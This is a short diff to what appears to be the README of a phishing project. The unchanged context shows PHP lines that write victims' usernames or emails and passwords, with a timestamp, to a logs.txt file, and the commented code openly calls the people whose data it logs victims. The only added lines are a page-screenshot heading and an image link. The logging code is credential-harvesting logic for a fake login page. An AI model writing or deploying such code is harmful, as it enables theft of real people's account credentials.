@@ -26,3 +26,6 @@ file_put_contents("logs.txt", "Date: " . $date . "\n", FILE_APPEND); // logs tim
 file_put_contents("logs.txt", "Username: " . $username . "\n" , FILE_APPEND); // logs victims username/email
 file_put_contents("logs.txt", "Password: ". $password . "\n\n", FILE_APPEND); // logs victims password
 ```
+
+### Page Screenshot
+![image](https://user-images.githubusercontent.com/104715127/177643156-bc7cc152-b50e-4182-abf1-df67a37aa6bf.png)
